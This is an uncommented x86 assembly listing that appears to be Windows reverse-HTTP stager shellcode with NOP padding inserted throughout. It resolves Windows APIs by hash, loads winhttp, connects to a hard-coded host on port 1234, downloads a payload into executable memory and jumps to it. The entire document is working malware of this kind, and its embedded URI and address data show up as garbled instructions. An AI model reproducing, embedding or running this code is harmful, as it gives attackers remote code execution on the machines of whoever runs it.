```asm
_start:
    nop
    cld
    call L_95
RET_6:
    pushal
    nop
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov ebp, esp
    nop
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    xor edi, edi
L_1e:
    nop
    xor eax, eax
    lodsb al, byte ptr [esi]
    nop
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    nop
    add edi, eax
    nop
    dec ecx
    jne L_1e
    push edx
    nop
    mov edx, dword ptr [edx + 0x10]
    nop
    push edi
    nop
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    nop
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    nop
    je L_8c
    add eax, edx
    nop
    mov ecx, dword ptr [eax + 0x18]
    nop
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    nop
    push eax
L_4b:
    nop
    test ecx, ecx
    nop
    je L_8b
    dec ecx
    xor edi, edi
    nop
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    nop
L_57:
    nop
    xor eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    nop
    push 0x707474
    push 0x686e6977
    push esp
    push 0x726774c
    call ebp
    xor ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push 0xbb9d1f04
    call ebp
    push eax
    push ebx
    push 0x4d2
    nop
    call L_325
RET_c2:
    push 0x74007400
    add byte ptr [eax], dh
    jae L_cc
L_cc:
    cmp al, byte ptr [eax]
    das
    add byte ptr [edi], ch
    add byte ptr [ecx], dh
    add byte ptr [edx], dh
    add byte ptr [edi], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [edx], bh
    add byte ptr [ecx], dh
    add byte ptr [edx], dh
    add byte ptr [ebx], dh
    add byte ptr [eax + eax], dh
    das
    add byte ptr [ebx], dl
    xor byte ptr [eax], al
    add byte ptr ss:[eax + eax], dh
    add byte ptr [edx], dl
    jae L_fe
L_fe:
    dec ecx
    add byte ptr [edx], dh
    pop edi
    add byte ptr [ecx], dh
    add byte ptr fs:[esi], ch
    jo L_10c
L_10c:
    jns L_10e
L_10e:
    add byte ptr [ecx], bh
    add byte ptr [edx], bl
    push ebp
    add byte ptr [0x51005300], ch
    add byte ptr [eax + eax + 0x48], al
    add byte ptr [edx], dh
    add byte ptr [ebp], dl
    inc esp
    add byte ptr [ebx], ch
    insd dword ptr es:[edi], dx
    add byte ptr [esi], dh
    push 0x55006b00
    add byte ptr [esi], dh
    dec ecx
    add byte ptr [eax], cl
    inc ebx
    add byte ptr [eax], cl
    outsb dx, byte ptr [esi]
    add byte ptr [esi], al
    xor eax, dword ptr [eax]
    jno L_144
L_144:
    inc esp
    add byte ptr [ecx], dh
    jns L_14a
L_14a:
    sub eax, 0x6f006b00
    add byte ptr [ebx], dh
    inc ecx
    add byte ptr [esi], dh
    add byte ptr [eax], dh
    add byte ptr gs:[eax + eax], dh
    add byte ptr fs:[edi], dl
    push 0x6a006e00
    add byte ptr [ebx], cl
    inc esi
    add byte ptr [edx], dh
    popal
    add byte ptr [eax], cl
    ja L_172
L_172:
    inc ebp
    add byte ptr [ebx], cl
    dec edx
    add byte ptr [edi], bl
    dec ecx
    add byte ptr [ebx], cl
    jb L_180
L_180:
    popal
    add byte ptr [eax + eax + 0x4c], dh
    add byte ptr [eax], bl
    aaa
    add byte ptr [eax + eax + 0x6a], ch
    add byte ptr [ecx], ch
    dec esp
    add byte ptr [ecx], dh
    add byte ptr [ebx], al
    sub eax, 0x4b004200
    add byte ptr [eax], ch
    js L_1a0
L_1a0:
    dec edx
    add byte ptr [ebx], dl
    push edi
    add byte ptr [ebx], dh
    bound eax, qword ptr [eax]
    dec edi
    add byte ptr [ebx], dh
    bound eax, qword ptr [eax]
    add byte ptr [ebp], ch
    push esi
    add byte ptr [ebx], dh
    add byte ptr [edx], bl
    jno L_1bc
L_1bc:
    pop edx
    add byte ptr [ecx], al
    push ebx
    add byte ptr [ecx], bh
    dec esi
    add byte ptr [ecx], al
    dec ebx
    add byte ptr [ebx], dh
    jo L_1ce
L_1ce:
    insb byte ptr es:[edi], dx
    add byte ptr [edx], cl
    dec eax
    add byte ptr [edx], al
    inc esp
    add byte ptr [eax], dh
    add byte ptr [ecx], ah
    add byte ptr gs:[edx], dh
    add byte ptr [eax + eax + 0x7a], al
    add byte ptr [esi], cl
    push esi
    add byte ptr [ecx], al
    bound eax, qword ptr [eax]
    add byte ptr gs:[eax + eax + 0x59], dh
    add byte ptr [esi], al
    xor dword ptr [eax], eax
    pop ecx
    add byte ptr [ebx], cl
    dec edi
    add byte ptr [esi], dh
    push ecx
    add byte ptr [edx], ah
    cmp dword ptr [eax], eax
    cmp byte ptr [eax], al
    xor byte ptr [eax], al
    push ebx
    add byte ptr [ecx], bh
    add byte ptr [edi], dh
    add byte ptr [ecx], al
    imul eax, dword ptr [eax], 0x35
    add byte ptr [esi], al
    jp L_218
L_218:
    add byte ptr ss:[ebp], ah
    push eax
    add byte ptr [edx], bl
    bound eax, qword ptr [eax]
    add byte ptr [eax], al
L_224:
    add edi, 0x2c
    nop
    push eax
    push 0xc21e9b46
    call ebp
    push 0x800100
    push ebx
    push ebx
    push ebx
    push edi
    push ebx
    push eax
    push 0x5bb31098
    call ebp
    xchg esi, eax
    nop
    sub esp, 0x10
    mov eax, esp
    push edi
    mov edi, eax
    push edi
    push 0x600ba721
    call ebp
    test eax, eax
    je L_2a3
    mov eax, dword ptr [edi + 4]
    nop
    test eax, eax
    je L_287
    pop edx
    sub edx, 0x2c
    push 1
    push ebx
    push ebx
    push eax
    push 3
    push 3
    mov eax, esp
    sub esp, 0xc
    mov edi, esp
    push edi
    push eax
    push edx
    lea eax, [esp + 0x40]
    push dword ptr [eax]
    push 0x49eaddda
    call ebp
    test eax, eax
    je L_2a3
    jmp L_296
L_287:
    mov eax, dword ptr [edi + 8]
    nop
    test eax, eax
    je L_2a3
    push 4
    pop eax
    add edi, eax
    dec eax
    mov dword ptr [edi], eax
L_296:
    push 0xc
    push edi
    push 0x26
    push esi
    push 0xce9d58d3
    call ebp
L_2a3:
    push 0x3300
    mov eax, esp
    push 4
    push eax
    push 0x1f
    push esi
    push 0xce9d58d3
    call ebp
    push 0xa
    pop edi
L_2ba:
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push esi
    push 0x91bb5895
    call ebp
    test eax, eax
    jne L_2d4
    dec edi
    jne L_2ba
L_2cf:
    call L_33f
L_2d4:
    push ebx
    push esi
    push 0x709d8805
    call ebp
    test eax, eax
    je L_2cf
    push ebx
    mov eax, esp
    push ebx
    mov edi, esp
    push edi
    push 4
    push eax
    push esi
    push 0x7e24296c
    call ebp
    pop ebx
    pop ebx
    test eax, eax
    je L_2cf
    xor eax, eax
    push 0x40
    push 0x1000
    push ebx
    push eax
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
    push ebx
    mov edi, esp
    push edi
    push eax
    push ebx
    push esi
    push 0x7e24296c
    call ebp
    test eax, eax
    je L_2cf
    pop eax
    ret
L_325:
    pop edi
    call L_224
    xor dword ptr [eax], eax
    xor al, byte ptr [eax]
    aaa
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [eax], al
    .byte 0x00
L_33f:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```